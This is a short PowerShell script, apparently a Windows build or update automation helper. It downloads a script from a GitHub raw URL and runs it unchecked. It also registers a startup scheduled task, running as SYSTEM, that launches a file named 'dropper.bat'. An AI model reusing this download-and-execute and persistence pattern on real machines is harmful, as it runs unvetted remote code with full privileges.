<# https://www.catalog.update.microsoft.com/Search.aspx?q=kb #>
mkdir c:\tempo
cd c:\tempo
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$currentfoldo = (Get-Location).Path
$launcher0 = "AutoBuildoo_v0.5.ps1"
$url = "https://raw.githubusercontent.com/nobyr/nobyr/main/$launcher0"
$output = "$currentfoldo\$launcher0"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)

# must fail the first run
dir c:\scripto

# must fail the first and last run
type c:\tempo\bootcount.txt

$trigger = New-JobTrigger -AtStartup
$PS = New-ScheduledTaskAction -Execute "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\dropper.bat"
Register-ScheduledTask -TaskName "AAA" -Trigger $trigger -User "NT Authority\SYSTEM" -Action $PS -ErrorAction Stop

PowerShell ".\$launcher0"

# start powershell "Get-Content C:\tempo\log.txt -Wait"
